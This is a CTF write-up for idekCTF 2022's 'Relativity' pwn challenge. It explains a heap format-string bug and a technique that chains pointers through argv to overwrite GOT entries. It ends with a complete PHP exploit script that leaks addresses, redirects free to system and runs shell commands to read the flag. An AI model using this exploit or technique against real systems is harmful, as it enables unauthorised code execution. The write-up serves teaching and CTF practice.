# Relativity - idekCTF 2022 (pwn, 13 solved, 494p)

## Introduction
Relativity is a pwn task.

An archive containing a binary and a libc is given.

The libc provided is `Ubuntu GLIBC 2.31-0ubuntu9.9`.

## Reverse engineering
The binary reads the user's input in a buffer on the heap.

The binary makes sure there is at most 2 `n` in the user's input. If it is the
case, it calls `printf` on the buffer, frees it and calls `_Exit` to terminate
the program.

```c
char *buffer = malloc(0x100);
fgets(buffer, 0x100, stdin);

if(NULL != strchr(buffer, 'n')
&& NULL != strchr(strchr(buffer, 'n') + 1, 'n')
&& NULL != strchr(strchr(strchr(buffer, 'n') + 1, 'n') + 1, 'n'))
	_Exit(0);

printf(buffer);
free(buffer);
_Exit(0);
```

## Vulnerability
The vulnerability is obviously a format string vulnerability.

## Exploitation
The binary limits the exploitation to a single format string that contains at
most 2 `%n`. On top of that, the buffer is located in the heap, meaning it is
not possible to "smuggle" arbitrary pointers on the stack to be used by the
format string.

There is a well-known technique that uses existing values on the stack.

The AMD64 ABI mandates that each program starts with a pointer to every
arguments (`argv`) and every environment variables (`envp`) on the stack.

`__libc_start_main` stores a pointer to the first value of these arrays on the
stack, meaning that *most* programs should have the following pointers:

```
char** argv -> char* argv[0] -> char argv[0][0]
char** envp -> char* envp[0] -> char envp[0][0]
```

The technique is to use "seek" the format index to `argv` and change the lower
16 bits of `argv[0]` so that it points to the return address of `printf`. Then a
second write can be issued to change the actual return address of `printf`.

```
char** argv -> char *argv[0] -> void* __builtin_return_address(0)
```

The second pointer chain can be used to write anything on the stack, and can
thus be transformed in an arbitrary write primitive.

There are rare cases where the previous assertion does not hold: a program may
have no arguments or no environment variable. (See [pwnkit].)

[pwnkit]: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt

```
char** argv -> char* argv[0] -> char argv[0][0]
char** envp -> NULL
```


This can be checked by "reading" the `argv` and `envp` pointers and checking the
value is not empty.

```
% echo 'argc = %27$u, argv = %28$p (%28$s), envp = %29$p (%29$s)' \
	| nc -v relativity.chal.idek.team 1337 \
	| xxd

Connection to relativity.chal.idek.team (34.85.228.88) 1337 port [tcp/menandmice-dns] succeeded!
00000000: 3d 3d 20 70 72 6f 6f 66 2d 6f 66 2d 77 6f 72 6b  == proof-of-work
00000010: 3a 20 64 69 73 61 62 6c 65 64 20 3d 3d 0a 57 6f  : disabled ==.Wo
00000020: 75 6c 64 20 79 6f 75 20 6c 69 6b 65 20 74 6f 20  uld you like to
00000030: 73 61 79 20 61 6e 79 74 68 69 6e 67 20 62 65 66  say anything bef
00000040: 6f 72 65 20 49 20 73 63 72 65 61 6d 20 69 6e 74  ore I scream int
00000050: 6f 20 74 68 65 20 76 6f 69 64 3f 20 0a 61 72 67  o the void? .arg
00000060: 63 20 3d 20 31 2c 20 61 72 67 76 20 3d 20 30 78  c = 1, argv = 0x
00000070: 37 66 66 65 37 61 64 64 66 38 64 38 20 28 d8 0f  7ffe7addf8d8 (..
00000080: de 7a fe 7f 29 2c 20 65 6e 76 70 20 3d 20 30 78  .z..), envp = 0x
00000090: 37 66 66 65 37 61 64 64 66 38 65 38 20 28 29 0a  7ffe7addf8e8 ().
```

There are no environment variables ! That is a bummer because nothing hinted
toward this unusual configuration. An indication (such as the task's
`Containerfile`) would have turned this specificity from a frustrating gimmick
to a clever twist.

This changes the attack plan because it is not possible to craft arbitrary
values on the stack. The new attack plan is to leverage the fact that the GOT is
writable to change `free`'s address.

1. change `argv[0]`'s pointer to `printf`'s return address,
   change `printf`'s return address to `vuln`;
2. change `printf`'s return address to `vuln`,
   change `argv[0]`'s pointer to `__libc_start_main`'s return address;
3. change `__libc_start_main`'s return address to `free@got.plt`,
   change `free@got.plt` to `vuln`;
4. change `__libc_start_main`'s return address to `_Exit@got.plt + 2*i`,
   change `_Exit@got.plt + 2*i` to craft a pointer to `system`;
5. repeat previous step 4 times;
6. change `__libc_start_main`'s return address to `free@got.plt`,
   change `free@got.plt` to `_Exit` to replace `free` with `system`.

It might seem redundant to change `printf`'s return address twice in step 1 and
2, but it is required to setup the stack properly.

The first step prepares a pointer to the return address and uses it to call the
`vuln` function again.

The second step overwrites the return address to `vuln` a second time. Since
`argv[0]`'s pointer is already pointing to `printf`'s return address, the first
write is not required and can be used for something else. Here, it is used to
prepare the write to `free@got.plt` done in the third step.

The downside of this approach is that it requires to partially guess the ASLR:
it requires 12 bits for the stack's slide because only the 4 least significant
bits of are fixed.

It also requires 4 additional bits for the binary's slide because only the 12
least significant bits of are fixed.

This results in a 16-bits (65,536) brute-force attack.

```
% while ! ./pwn.php; do :; done

uid=1000(user) gid=1000(user) groups=1000(user)
total 32
drwxr-xr-x 2 nobody nogroup  4096 Jan  2 19:22 .
drwxr-xr-x 3 nobody nogroup  4096 Jan  2 19:22 ..
-r-xr-xr-x 1 nobody nogroup 17304 Nov 21 22:38 chal
-rw-r--r-- 1 nobody nogroup    64 Nov 21 22:42 flag.txt
idek{printf_is_very_powerful_but_the_got_is_even_more_powerful}
```

**Flag**: `idek{printf_is_very_powerful_but_the_got_is_even_more_powerful}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
const LOCAL = false;
const HOST  = "relativity.chal.idek.team";
const PORT  = 1337;

const IDX_SHIFT   = 4; // each call to vuln shifts stack by 4 * 8 bytes
const IDX_BASE    = 9;

const IDX_ARGV    = 13; // 28 is good too
const IDX_ARG0    = 41;

//const IDX_ENVP    = 29;
//const IDX_ENV0    = 43; // DOES NOT WORK ON REMOTE !!

// PIE
const ASLR_BASE   = 0;
const ASLR_LOOP   = ASLR_BASE + 0x127F;
const ASLR_FREE   = ASLR_BASE + 0x4018;
const ASLR_EXIT   = ASLR_BASE + 0x4050;
const ASLR_VULN   = ASLR_BASE + 0x1229;
const ASLR_JMP    = ASLR_BASE + 0x1130; // jump to _exit

// stack
const ASLR_RET    = 0x0c30 - 0x28;
//const ASLR_RET = 0xDDB0 - 0x28;

function expect_check(string $left, string $right)
{
	if($left !== $right) {
		fprintf(STDERR, "Wanted: %s\n", $left);
		fprintf(STDERR, "Got:    %s\n", $right);
		throw new Exception("Unexpected data");
	}
}

function expect($fp, string $str)
{
	$data = fread($fp, strlen($str));
	expect_check($str, $data);
}

function expectLine($fp, string $line)
{
	$data = fgets($fp);
	expect_check("$line\n", $data);
}

function line($fp) : string
{
	$line = fgets($fp);

	if("\n" !== substr($line, -1))
		throw new Exception("fgets did not return a line");

	return substr($line, 0, -1);
}



// Format string primitives
function c8(int $n) : string
{
	return sprintf("%%" . "%03d" . "c", 0xFF & $n);
}

function n8(int $idx) : string
{
	return sprintf("%%" . "%d" . "\$hhn", $idx);
}

function cn8(int $idx, int $n) : string
{
	return c8($n) . n8($idx);
}

function c16(int $n) : string
{
	return sprintf("%%" . "%05d" . "c", 0xFFFF & $n);
}

function n16(int $idx) : string
{
	return sprintf("%%" . "%d" . "\$hn", $idx);
}

function cn16(int $idx, int $n) : string
{
	return c16($n) . n16($idx);
}

function fmt($fp, string $s) : string
{
	if(strlen($s) >= 0x100)
		throw new Exception("Too big!");

	fwrite($fp, "$s\n");

	$buffer = line($fp);
	$line   = line($fp);

	while($line !== "Would you like to say anything before I scream into the void? ") {
		$buffer = $buffer . "\n" . $line;
		$line   = line($fp);
	}

	return $buffer;
}

//printf("[*] Opening connection\n");
$time = microtime(true);

$fp = fsockopen(HOST, PORT);

if(!LOCAL)
	expectLine($fp, "== proof-of-work: disabled ==");

//printf("[+] Done in %f seconds\n", microtime(true) - $time);
//printf("\n");

expectLine($fp, "Would you like to say anything before I scream into the void? ");


step1: // leak and loop
$payload = "";

// Padding
$idx = 8;
$payload .= str_repeat("%c", $idx);
$size = $idx;

// 9: base + 0x135c (ret addr of main)
$idx++;
$payload .= "%016lX";
$size += 16;

// 10: uninteresting
$idx++;
$payload .= "%c";
$size += 1;

// 11: libc + 0x24083 (ret addr of __libc_start_main)
$idx++;
$payload .= "%016lX";
$size += 16;


// padding for argv
$target = IDX_ARGV - 2;
assert($target >= 0);

$payload .= str_repeat("%c", $target - $idx);
$size += $target - $idx;
$idx   = $target;

// argv[0] points to &return addr
$target   = ASLR_RET;
$payload .= c16($target - $size);
$payload .= "%hn";
$size     = $target;

// We can use $ from now on

// loop in vuln
$target   = ASLR_LOOP;
$payload .= cn16(IDX_ARG0, $target - $size);
$size     = $target;

try {
	$leak = fmt($fp, $payload);
} catch(Exception $e) {
	exit(1);
}

$base = hexdec(substr($leak, 0x08, 16)) - 0x135C;
$libc = hexdec(substr($leak, 0x19, 16)) - 0x24083;

printf("[+] Base: %X\n", $base);
printf("[+] libc: %X\n", $libc);
printf("\n");

assert(0 === ($base & 0xFFF));
assert(0 === ($base >> 48));

assert(0 === ($libc & 0xFFF));
assert(0 === ($libc >> 48));

$system = $libc + 0x00052290;

step2: // prepare a pointer to free
$size     = ASLR_LOOP;
$payload  = cn16(IDX_ARG0, $size);

$target   = ASLR_RET + 0x20;
$payload .= cn16(IDX_ARGV, $target - $size);
$size     = $target;

fmt($fp, $payload);


step3: // patch free
$size     = IDX_ARG0 - 2;
$payload  = str_repeat("%c", $size);

$target   = ASLR_FREE;
$payload .= c16($target - $size);
$size     = $target;

$payload .= "%hn";

$target   = ASLR_VULN;
$payload .= cn16(IDX_BASE, $target - $size);

fmt($fp, $payload);


step4: // first call to free, prepare loop again
for($i = 0; $i < 4; $i++) {
	$shift = 1 + $i;
	$short = 0xFFFF & ($system >> (16 * $i));

	$payload = "";

	$size     = IDX_SHIFT * $shift + IDX_ARG0 - 2;
	$payload  = str_repeat("%c", $size);

	$target   = ASLR_EXIT + 2 * $i;
	$payload .= c16($target - $size);
	$size     = $target;

	$payload .= "%hn";

	// write short at exit + o
	$target   = $short;
	$payload .= cn16(IDX_SHIFT * $shift + IDX_BASE, $target - $size);

	fmt($fp, $payload);
}

step5: // redirect free to exit (now system)
$shift = 5;
$short = 0x00001130;

$payload = "id; ls -la; cat *flag* #";
$size = strlen($payload);

$idx      = IDX_SHIFT * $shift + IDX_ARG0 - 2;
$payload .= str_repeat("%c", $idx);
$size    += $idx;

$target   = ASLR_FREE;
$payload .= c16($target - $size);
$size     = $target;

$payload .= "%hn";

$target   = $short;
$payload .= cn16(IDX_SHIFT * $shift + IDX_BASE, $target - $size);

fwrite($fp, "$payload\n");

while($buffer = fread($fp, 4096))
	echo $buffer;
```
